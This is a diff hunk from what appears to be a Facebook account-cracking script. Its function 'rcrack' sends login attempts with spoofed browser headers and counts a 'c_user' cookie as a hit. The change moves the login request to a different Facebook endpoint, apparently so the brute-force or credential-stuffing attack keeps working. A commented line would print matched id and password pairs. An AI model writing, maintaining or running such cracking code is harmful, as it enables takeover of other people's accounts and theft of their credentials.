@@ -255,7 +255,7 @@ def rcrack(uid,pwx,tl):
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
 
                        'viewport-width': '980',}
-			lo = session.post('https://mbasic.facebook.com/', cookies=cookies, headers=headers).text
+			lo = session.post('https://web.facebook.com/?_rdc=1&_rdr', cookies=cookies, headers=headers).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
